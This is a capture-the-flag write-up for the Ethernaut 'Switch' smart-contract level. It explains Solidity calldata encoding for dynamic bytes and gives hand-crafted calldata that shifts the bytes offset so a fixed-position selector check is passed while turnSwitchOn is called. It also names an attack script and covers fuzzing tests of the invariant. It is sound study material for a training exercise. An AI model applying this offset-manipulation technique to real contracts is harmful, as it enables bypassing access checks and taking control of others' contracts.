# Switch

[Switch](https://ethernaut.openzeppelin.com/level/0xb6793dA57738f247cf8EA28d1b18C6E560B3903C)

_flip the switch_


1. When dealing with dynamic types calldata encodes an argument as follows: <BR />
    ```
    |--- x-bytes ---| |-------32-bytes-------| |--- y-bytes ---| |- z-bytes --|
    <other arguments> <Offset of Dynamic type> <other arguments> <Dynamic type>
    ```

1. An argument of type bytes is then encoded as a length prefixed array
    ```
    |-------------------- z-bytes ----------------------|
    <------------------ Dynamic type ------------------->

    |- 32-bytes -| |- packed bytes rounded to 32-bytes -|
    <-- length --> <---------- byte elements ----------->
    ```

1. Our goal is to call `turnSwitchOn()` by passing its selector to `flipSwitch(bytes)` bytes parameter.
    Specifically the selector must be set within the first 4-bytes of the `flipSwitch` argument.

1. The standard way to encode the bytes argument for such a function signature is:
    ```
    Selector:            00 | 30c13ade
    Dynamic Type Offset: 04 | 0000000000000000000000000000000000000000000000000000000000000020
    Number of Bytes:     24 | 0000000000000000000000000000000000000000000000000000000000000004
    Four data bytes:     44 | 20606e1500000000000000000000000000000000000000000000000000000000
    ```

1. The `Switch` verifies that the calldata at offset 68 (0x44) is the selector for the function `turnSwitchOff()` 
   and our solution must satisfy this condition.

1. The solution must simply force the bytes argument to start after the `turnSwitchOff()` selector.
    ```
    Selector:            00 | 30c13ade
    Dynamic Type Offset: 04 | 0000000000000000000000000000000000000000000000000000000000000060
    Unused Bytes:        24 | 0000000000000000000000000000000000000000000000000000000000000000
    Unused Bytes:        44 | 20606e1500000000000000000000000000000000000000000000000000000000
    Number of Bytes:     64 | 0000000000000000000000000000000000000000000000000000000000000004
    Four data bytes:     84 | 76227e1200000000000000000000000000000000000000000000000000000000
    ```


<BR />

## Live Attack

```BASH
./attackDo.sh
```

<BR />

## Vulnerability Testing Tools

Testing Invariant: _Switch should never be on._


Neither [Echidna](./src/echidna/EchidnaFuzz.sol) nor [Foundry](./test/InvariantTest.t.sol) fuzzing manage to generate the magic value that turns the switch on. 

Interestingly Foundry manages to break the [invariant](./test/InvariantTest.t.sol) by doing something that is impossible in real-live. It sends transactions to the `Switch` contract where the sender has the `Switch` contract address. This was disabled using: <BR />

```JS
excludeSender(address(singlePole));
```

<BR />


